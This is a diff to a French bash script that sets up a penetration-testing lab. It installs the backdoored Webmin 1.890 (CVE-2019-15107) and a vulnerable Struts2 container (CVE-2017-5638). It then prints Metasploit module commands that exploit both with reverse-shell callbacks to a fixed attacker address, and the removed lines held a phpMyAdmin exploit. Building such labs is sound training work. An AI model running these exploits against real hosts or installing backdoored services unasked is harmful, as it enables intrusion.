@@ -2,7 +2,8 @@
 set -e
 
 echo "=========================================="
-echo "  phpMyAdmin 4.6.2 - Installation FINALE"
+echo "  Installation DOUBLE - Webmin + Struts2"
+echo "  Au moins un va marcher !"
 echo "=========================================="
 echo ""
 
@@ -11,71 +12,203 @@ if [ "$EUID" -ne 0 ]; then
     exit 1
 fi
 
-WORKDIR="/tmp/phpmyadmin-build-$$"
-mkdir -p "$WORKDIR"
-cd "$WORKDIR"
+SERVER_IP=$(hostname -I | awk '{print $1}')
 
-echo "[1/4] Création Dockerfile optimisé..."
-cat > Dockerfile << 'EOF'
-FROM php:7.4-apache
+# ==========================================
+# PARTIE 1 : WEBMIN 1.890 (Port 10000)
+# ==========================================
 
-# Installer extensions PHP (sans apt-get update)
-RUN docker-php-ext-install mysqli
+echo ""
+echo "=========================================="
+echo "  [1/2] INSTALLATION WEBMIN 1.890"
+echo "=========================================="
+echo ""
 
-# Télécharger phpMyAdmin directement
-WORKDIR /var/www/html
-ADD https://files.phpmyadmin.net/phpMyAdmin/4.6.2/phpMyAdmin-4.6.2-all-languages.tar.gz /tmp/pma.tar.gz
-RUN tar xzf /tmp/pma.tar.gz --strip-components=1 && rm /tmp/pma.tar.gz
+WEBMIN_SUCCESS=0
 
-# Configuration
-RUN cp config.sample.inc.php config.inc.php \
-    && sed -i "s/\$cfg\['blowfish_secret'\] = '';/\$cfg['blowfish_secret'] = 'iron4software123456789012345678901234';/" config.inc.php \
-    && mkdir -p tmp && chmod 777 tmp \
-    && chown -R www-data:www-data /var/www/html
+echo "[1.1] Installation dépendances Webmin..."
+apt-get update -qq > /dev/null 2>&1 || true
+apt-get install -y wget perl libnet-ssleay-perl openssl libauthen-pam-perl > /dev/null 2>&1 || true
 
-EXPOSE 80
-CMD ["apache2-foreground"]
-EOF
+echo "[1.2] Téléchargement Webmin 1.890..."
+cd /tmp
+rm -f webmin_1.890_all.deb
 
-echo "[2/4] Nettoyage..."
+wget -q http://prdownloads.sourceforge.net/webadmin/webmin_1.890_all.deb 2>/dev/null || {
+    echo "   ⚠️  SourceForge échoué, essai archive.org..."
+    wget -q https://web.archive.org/web/20190818000000id_/http://prdownloads.sourceforge.net/webadmin/webmin_1.890_all.deb 2>/dev/null || {
+        echo "   ❌ Téléchargement Webmin échoué"
+    }
+}
+
+if [ -f "webmin_1.890_all.deb" ]; then
+    echo "[1.3] Installation Webmin..."
+    dpkg -i webmin_1.890_all.deb 2>/dev/null || {
+        apt-get install -f -y > /dev/null 2>&1
+        dpkg -i webmin_1.890_all.deb 2>/dev/null
+    }
+    
+    if [ -f "/etc/webmin/miniserv.conf" ]; then
+        /etc/init.d/webmin start 2>/dev/null || systemctl start webmin 2>/dev/null || true
+        sleep 3
+        
+        if netstat -tlnp 2>/dev/null | grep -q ":10000 " || ss -tlnp 2>/dev/null | grep -q ":10000 "; then
+            echo "   ✅ Webmin installé et actif sur port 10000"
+            WEBMIN_SUCCESS=1
+        else
+            echo "   ❌ Webmin installé mais ne démarre pas"
+        fi
+    else
+        echo "   ❌ Installation Webmin échouée"
+    fi
+else
+    echo "   ❌ Fichier Webmin introuvable"
+fi
+
+
+# ==========================================
+# PARTIE 2 : STRUTS2 CVE-2017-5638 (Port 8080)
+# ==========================================
+
+echo ""
+echo "=========================================="
+echo "  [2/2] INSTALLATION STRUTS2"
+echo "=========================================="
+echo ""
+
+STRUTS_SUCCESS=0
+
+echo "[2.1] Nettoyage anciens containers..."
+docker stop struts2-vuln 2>/dev/null || true
+docker rm struts2-vuln 2>/dev/null || true
 docker stop phpmyadmin-vuln 2>/dev/null || true
 docker rm phpmyadmin-vuln 2>/dev/null || true
 
-echo "[3/4] Build (patience 2 min)..."
-docker build -t pma:4.6.2 . || {
-    echo "❌ Build failed"
-    exit 1
+echo "[2.2] Pull image Struts2 vulnérable..."
+docker pull vulnerables/cve-2017-5638 2>/dev/null || {
+    echo "   ⚠️  Image principale échouée, essai alternative..."
+    docker pull piesecurity/apache-struts2-cve-2017-5638 2>/dev/null || {
+        echo "   ❌ Aucune image Struts2 disponible"
+    }
 }
 
-echo "[4/4] Démarrage..."
+echo "[2.3] Lancement Struts2..."
 docker run -d \
-    --name phpmyadmin-vuln \
-    --add-host=host.docker.internal:host-gateway \
-    -p 8080:80 \
-    pma:4.6.2
+    --name struts2-vuln \
+    --restart unless-stopped \
+    -p 8080:8080 \
+    vulnerables/cve-2017-5638 2>/dev/null || \
+docker run -d \
+    --name struts2-vuln \
+    --restart unless-stopped \
+    -p 8080:8080 \
+    piesecurity/apache-struts2-cve-2017-5638 2>/dev/null || {
+    echo "   ❌ Lancement Struts2 échoué"
+}
 
-sleep 15
-cd /
-rm -rf "$WORKDIR"
+sleep 10
 
-IP=$(hostname -I | awk '{print $1}')
+if docker ps 2>/dev/null | grep -q struts2-vuln; then
+    echo "   ✅ Struts2 installé et actif sur port 8080"
+    STRUTS_SUCCESS=1
+else
+    echo "   ❌ Struts2 non actif"
+fi
+
+
+# ==========================================
+# RÉSUMÉ FINAL
+# ==========================================
 
 echo ""
 echo "=========================================="
-echo "  ✅ PRÊT !"
+echo "  📊 RÉSUMÉ INSTALLATION"
 echo "=========================================="
-docker ps | grep phpmyadmin
 echo ""
-echo "URL: http://${IP}:8080/"
-curl -I http://localhost:8080/ 2>/dev/null | head -3
+
+if [ $WEBMIN_SUCCESS -eq 1 ]; then
+    echo "✅ Webmin 1.890"
+    echo "   URL: https://${SERVER_IP}:10000/"
+    echo "   CVE: CVE-2019-15107 (Backdoor)"
+    echo "   Credentials: root / (password root serveur)"
+else
+    echo "❌ Webmin - Installation échouée"
+fi
+
 echo ""
-echo "METASPLOIT (depuis Kali):"
+
+if [ $STRUTS_SUCCESS -eq 1 ]; then
+    echo "✅ Apache Struts2"
+    echo "   URL: http://${SERVER_IP}:8080/"
+    echo "   CVE: CVE-2017-5638 (RCE)"
+    echo "   Pas de credentials nécessaires"
+else
+    echo "❌ Struts2 - Installation échouée"
+fi
+
 echo ""
-echo "use exploit/multi/http/phpmyadmin_preg_replace"
-echo "set RHOSTS ${IP}"
-echo "set RPORT 8080"
-echo "set USERNAME root"
-echo "set PASSWORD rootpass"
-echo "set LHOST 192.168.100.10"
-echo "exploit"
+
+if [ $WEBMIN_SUCCESS -eq 0 ] && [ $STRUTS_SUCCESS -eq 0 ]; then
+    echo "=========================================="
+    echo "  ❌ ÉCHEC TOTAL"
+    echo "=========================================="
+    echo ""
+    echo "Les deux installations ont échoué."
+    echo "Vérifie la connexion internet et les logs."
+    exit 1
+fi
+
+echo "=========================================="
+echo "  🔥 EXPLOITATION METASPLOIT"
+echo "=========================================="
+echo ""
+
+if [ $WEBMIN_SUCCESS -eq 1 ]; then
+    echo "▶ WEBMIN 1.890 (CVE-2019-15107):"
+    echo ""
+    echo "msfconsole -q"
+    echo "use exploit/unix/webapp/webmin_backdoor"
+    echo "set RHOSTS ${SERVER_IP}"
+    echo "set RPORT 10000"
+    echo "set SSL true"
+    echo "set LHOST 192.168.100.10"
+    echo "set LPORT 4444"
+    echo "exploit"
+    echo ""
+fi
+
+if [ $STRUTS_SUCCESS -eq 1 ]; then
+    echo "▶ STRUTS2 (CVE-2017-5638):"
+    echo ""
+    echo "msfconsole -q"
+    echo "use exploit/multi/http/struts2_content_type_ognl"
+    echo "set RHOSTS ${SERVER_IP}"
+    echo "set RPORT 8080"
+    echo "set TARGETURI /struts2-showcase/integration/saveGangster.action"
+    echo "set LHOST 192.168.100.10"
+    echo "set LPORT 4445"
+    echo "exploit"
+    echo ""
+fi
+
+echo "=========================================="
+echo "  📝 SCÉNARIOS LAB"
+echo "=========================================="
+echo ""
+
+if [ $WEBMIN_SUCCESS -eq 1 ]; then
+    echo "Webmin: Panneau d'administration du serveur mail"
+    echo "        Gestion users, logs, firewall, cron jobs"
+    echo ""
+fi
+
+if [ $STRUTS_SUCCESS -eq 1 ]; then
+    echo "Struts2: Portail intranet Iron4Software"
+    echo "         Application Java RH/gestion interne"
+    echo ""
+fi
+
+echo "=========================================="
+echo "  ✅ AU MOINS UNE CIBLE DISPONIBLE !"
+echo "=========================================="
 echo ""
